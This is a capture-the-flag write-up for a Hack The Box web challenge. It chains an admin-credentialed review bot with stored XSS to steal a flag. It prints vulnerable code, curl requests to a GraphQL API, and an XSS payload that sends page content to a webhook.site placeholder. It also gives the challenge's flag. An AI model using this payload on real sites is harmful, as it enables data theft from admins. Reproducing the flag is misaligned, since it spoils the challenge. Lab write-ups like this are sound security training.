# Blackout Ops - CTF Write-Up

## Challenge Overview

**Challenge Name:** Blackout Ops  
**Category:** Web  
**Difficulty:** easy  
**Flag:** `HTB{l00k0ut_f04_mult1p4rt_byP455_4nd_gr4phQL_bug5_a70ebf5351f3d0d483467a54f35b3682}`

This is a web application that simulates a security incident reporting system. The application uses Express.js with GraphQL and has several critical vulnerabilities that can be chained together to extract the flag.

## Initial Reconnaissance

### Application Structure
- **Frontend:** HTML templates with JavaScript
- **Backend:** Express.js with GraphQL API
- **Database:** SQLite
- **File Upload:** Supports file uploads for evidence
- **Bot:** Puppeteer bot that visits submitted evidence URLs with admin credentials

### Key Endpoints
- `/` - Login page
- `/dashboard` - Main dashboard (requires authentication)
- `/admin` - Admin panel (admin role required) - **Contains the flag**
- `/graphql` - GraphQL API endpoint
- `/upload` - File upload endpoint
- `/files/*` - Static file serving for uploads

## Vulnerability Analysis

### 1. SSRF (Server-Side Request Forgery) via Bot
**Location:** `challenge/graphql/resolvers.js:104-118`

When submitting an incident report with an `evidenceUrl`, the bot automatically visits the URL with admin credentials:

```javascript
if (args.evidenceUrl) {
  db.get("SELECT email, password FROM users WHERE role = 'admin' LIMIT 1", [], (err, adminUser) => {
    if (err || !adminUser) {
      console.error("Error fetching admin credentials:", err || "No admin user found");
    } else {
      const bot = require('../bot');
      bot.visitReport(args.evidenceUrl, adminUser.email, adminUser.password)
        .catch(err => console.error("Bot error:", err));
    }
  });
}
```

### 2. Stored XSS in Admin Panel
**Location:** `challenge/views/admin.html:85-133`

The admin panel renders incident reports without proper HTML escaping:

```javascript
container.innerHTML = reports.map(report => `
  <div class="terminal p-4 border border-cyan-400/50">
    <h3 class="text-sm mb-2">${report.title}</h3>    // XSS HERE
    <p class="text-xs text-cyan-500/80 mb-4">${report.details}</p>  // XSS HERE
  </div>
`).join('');
```

### 3. Flag Exposure in Admin Panel
**Location:** `challenge/routes/pages.js:28-29`

The admin route reads the flag and renders it directly in the template:

```javascript
router.get('/admin', (req, res) => {
  if (!req.session.user || req.session.user.role !== 'admin') {
    return res.redirect('/dashboard');
  }
  const flag = fs.readFileSync('/flag.txt', 'utf8');
  res.render('admin.html', { flag });  // Flag rendered in <h4>{{flag}}</h4>
});
```

## Exploitation Strategy

### Step 1: Account Registration and Verification

First, register an account and verify it to gain access to incident reporting:

```bash
# Register account
curl -X POST "http://target:port/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { register(email: \"test@blackouts.htb\", password: \"password123\") { id email inviteCode verified } }"
  }'
```

```bash
# Login to get session cookie
curl -X POST "http://target:port/graphql" \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{
    "query": "mutation { login(email: \"test@blackouts.htb\", password: \"password123\") { id email verified } }"
  }'
```

```bash
# Verify account with invite code
curl -X POST "http://target:port/graphql" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "query": "mutation { verifyAccount(inviteCode: \"INVITE_CODE_HERE\") { id email verified } }"
  }'
```

### Step 2: Create XSS Payload

Create an incident report with a stored XSS payload that will execute when the admin bot views the admin panel:

```json
{
  "query": "mutation { submitIncidentReport(title: \"Evidence\", details: \"<img src=x onerror='setTimeout(function(){var flag=document.querySelector(\\\"h4\\\").textContent;var img=new Image();img.src=\\\"https://webhook.site/YOUR-WEBHOOK-ID?flag=\\\"+encodeURIComponent(flag);},2000)'>\", evidenceUrl: \"http://example.com\") { id } }"
}
```

This payload:
1. Uses an `<img>` tag with invalid `src` to trigger `onerror`
2. Waits 2 seconds for the page to load
3. Extracts the flag from the `<h4>` element containing `{{flag}}`
4. Sends the flag to an external webhook via an image request

### Step 3: Trigger the Bot

Submit another incident report to trigger the bot to visit the admin panel:

```bash
curl -X POST "http://target:port/graphql" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "query": "mutation { submitIncidentReport(title: \"Trigger\", details: \"trigger bot\", evidenceUrl: \"http://127.0.0.1:1337/admin\") { id } }"
  }'
```

### Step 4: Collect the Flag

The bot will:
1. Visit the admin panel with admin credentials
2. Load all incident reports (including our XSS payload)
3. Execute the JavaScript payload
4. Extract the flag from the admin page
5. Send it to your webhook

Check your webhook logs to retrieve the flag!

## Attack Chain Summary

```
1. Register Account → 2. Verify Account → 3. Submit XSS Payload → 4. Trigger Bot → 5. Extract Flag
```

## Key Vulnerabilities Exploited

1. **SSRF:** Bot visits user-controlled URLs with admin privileges
2. **Stored XSS:** Incident report fields not properly sanitized
3. **Information Disclosure:** Flag directly rendered in admin panel HTML
4. **Authentication Bypass:** Using bot's admin session to access restricted content

## Mitigation Recommendations

1. **Input Sanitization:** Properly escape all user input before rendering in HTML
2. **URL Validation:** Restrict bot to only visit trusted domains/URLs
3. **CSP Headers:** Implement Content Security Policy to prevent XSS
4. **Bot Isolation:** Run bot in sandboxed environment with limited privileges
5. **Secret Management:** Don't expose sensitive data directly in templates

## Additional Vulnerabilities Found

- **Hardcoded Session Secret:** `'your-secret-key'` in app.js
- **Path Traversal:** File upload accepts `../` sequences
- **No Password Hashing:** Passwords stored in plaintext
- **No File Type Validation:** Upload accepts any file type
- **SQL Injection Potential:** Some parameterized queries could be vulnerable

This challenge demonstrates how multiple vulnerabilities can be chained together to achieve full compromise of a web application.

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)